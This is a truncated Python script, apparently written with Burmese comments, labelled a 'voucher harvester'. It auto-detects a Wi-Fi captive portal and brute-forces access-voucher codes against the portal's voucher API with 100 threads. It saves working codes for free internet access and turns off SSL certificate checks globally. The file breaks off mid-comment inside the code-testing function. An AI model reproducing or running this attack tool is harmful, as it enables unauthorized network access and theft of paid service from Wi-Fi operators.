import requests
import re
import urllib3
import time
import threading
import random
from datetime import datetime, timedelta
import sys
import os
import ssl

# --- SSL ERROR FIX ---
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
TRIED_CODES_FILE = "tried_codes.txt"
SUCCESS_CODES_FILE = "success.txt"
VOUCHER_THREADS = 100 

# --- CLEAR SCREEN FUNCTION ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- CACHE MANAGEMENT ---
def load_tried_codes():
    if not os.path.exists(TRIED_CODES_FILE):
        return set()
    with open(TRIED_CODES_FILE, "r") as f:
        return set(line.strip() for line in f)

def save_tried_code(code):
    with open(TRIED_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

def save_success_code(code):
    with open(SUCCESS_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

# --- MENU SYSTEM ---
def show_menu():
    clear_screen()
    print("========================================")
    print("         🛠️  VOUCHER HARVESTER          ")
    print("========================================")
    print("1. 🌐 Internet Access (Use Success Code)")
    print("2. 🔍 Test Specific Code")
    print("3. 🔍 Fast Random Voucher Harvesting")
    print("4. 📋 View Success Codes")
    print("========================================\n")
    choice = input("👉 ရွေးချယ်ပါ (1-4): ")
    return choice

# --- PORTAL AUTO DETECT ---
def get_portal_info():
    """Captive Portal URL ကို အလိုအလျောက်ရှာဖွေခြင်း"""
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = requests.get(test_url, allow_redirects=True, timeout=5)
        if r.url != test_url:
            from urllib.parse import urlparse
            parsed = urlparse(r.url)
            return f"{parsed.scheme}://{parsed.netloc}", r.url
    except:
        pass
    return None, None

# --- FAST RANDOM VOUCHER HARVESTING LOGIC ---
def test_code(code, portal_host, sid, session):
    """တစ်ခုချင်းစီကို Thread နဲ့စမ်းသပ်သည့် function"""
    voucher_api = f"{portal_host}/api/auth/voucher/"
    try:
        # --- API CALL စမ်းသပ်သည့်နေရာ ---
        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
        
        # --- RESPONSE စစ်ဆေးခြင်း ---
        if v_res.status_code == 200:
            # တိကျစွာစစ်ဆေးခြင်း (Response text တွင် "success" ဟု တိတိကျကျပါမှ
            
